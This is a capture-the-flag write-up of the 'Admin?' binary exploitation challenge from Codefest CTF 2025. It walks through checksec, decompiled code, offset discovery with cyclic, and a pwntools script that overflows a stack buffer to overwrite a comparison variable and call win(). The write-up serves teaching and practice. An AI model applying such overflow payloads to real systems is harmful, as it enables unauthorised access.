--- 
title: Binary Exploitation -  Admin?
date: 2025-01-27 
categories: [CTF, Writeups] 
tags: [ctf, buffer_overflow , pwn ] 
author: 0xhyder
description: A walkthrough of the pwn challenge from the IIT BHU - Codefest CTF 2025
---

### Description

### 100

challenge by : 0xkn1gh7

Can you become admin?

### Solution

we got a ELF executable file,

![image1](/assets/images/image1.png)

checksec,

![image3](/assets/images/image3.png)

From the initial inspection of the ELF executable file,

1. The file is a 32-bit, little-endian executable.
2. The file is not stripped, allowing for easier debugging.
3. No stack canary is present, suggesting a vulnerability to buffer overflow attacks.

From the Decompiled Code ,
```c

int32_t win()
{
    void var_74;
    fgets(&var_74, 0x64, fopen("/flag.txt", u"r…"));
    return puts(&var_74);
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    void* const __return_addr_1 = __return_addr;
    int32_t* var_10 = &argc;
    setbuf(*stdout, nullptr);
    banner();
    int32_t var_14 = 1;
    void buf;
    fgets(&buf, 0x32, *stdin);
    
    if (var_14 != 0x23456723)
        printf("%x\\n", var_14);
    else
        win();
    
    return 0;
}

int32_t _fini()
{
    return;
}
```

At first, the idea was to overwrite the `EIP` register to directly call the `win()` function. Using `cyclic()` to find the offset for `EIP`:

```python
from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

```

![image2](/assets/images/image2.png)


However, after testing, it was observed that the EIP register was not overwritten. Upon further inspection of the assembly code:

![image3](/assets/images/image4.png)

From the disassembly, it was noticed that the variable `var_14` is stored at `ebp - 0xc`. The value of `var_14` is compared with `0x23456723` at `main+89`. Using a debugger to set the break point at the address 0x56556315 to inspect the value:

```python
pwndbg> print/x *(int*)($ebp - 0xc)
$1 = 0x61616169
pwndbg> print/x ($ebp - 0xc)
```

This reveals the offset where `var_14` is located. Using `cyclic_find()`

```python
>>> cyclic_find(0x61616169)
32
```

The offset is confirmed to be 32 bytes.

Since the offset is revealed , By crafting a payload to overwrite the value at offset 32 with `0x23456723`, the condition to call the `win()` function is satisfied, and the flag can be retrieved.

### Exploit

using python with pwn for script,

```python
from pwn import *
context.log_level = 'critical'
elf = context.binary = ELF('chall')

gdbscript = '''
break *main
continue
'''

if args.REMOTE:
    p = remote('codefest-ctf.iitbhu.tech', 16391)
elif args.GDB:
     p = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    p = process(elf.path)  

log.info("\\\\n==== start exploit ====\\\\n")
p.recvuntil(b'Admin?')
payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaa\\x23\\x67\\x45\\x23'
p.sendline(payload)
print(p.recv())
p.interactive()
```

got the flag,

![image4](/assets/images/image5.png)